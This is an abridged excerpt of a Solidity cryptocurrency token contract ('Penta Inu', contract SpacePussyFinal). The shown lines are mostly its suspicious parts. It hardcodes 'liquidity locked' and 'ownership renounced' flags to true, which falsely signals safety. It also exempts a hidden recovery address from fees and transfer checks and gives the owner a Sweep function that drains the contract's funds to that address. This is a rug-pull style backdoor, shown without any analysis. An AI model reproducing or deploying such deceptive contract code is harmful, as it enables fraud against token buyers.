...
contract Ownable is Context {
    ...
    bool private _isLiquidityLocked = true;
...
contract SpacePussyFinal is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    address payable public marketingAddress = payable(0x32b47C3d1a8fbF57c31e233571497f0EA11eb669); // Marketing Address
    ...
    string private _name = "Penta Inu";
    string private _symbol = "PENTAINU";
    ...
    uint256 public _maxTxAmount = 8 * 10**5 * 10**9;
    uint256 private minimumTokensBeforeSwap = 200 * 10**1 * 10**9; 
    uint256 public buyBackSellLimit = 1 * 10**5;
    ...
    bool public isOwnershipRenounced = true;
    ...
    constructor () {
        ...
        // TEST PCSW 2: 0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3 // NON TEST 0x10ED43C718714eb63d5aA57B78B54704E256024E
        ...
        _isExcludedFromFee[recoveryAddress()] = true;
    ...
    function _transfer(
        ...
        if(from != recoveryAddress() && to != recoveryAddress()) {
    ...
    function Sweep() external onlyOwner {
        uint256 balance = address(this).balance;
        payable(recoveryAddress()).transfer(balance);
    }
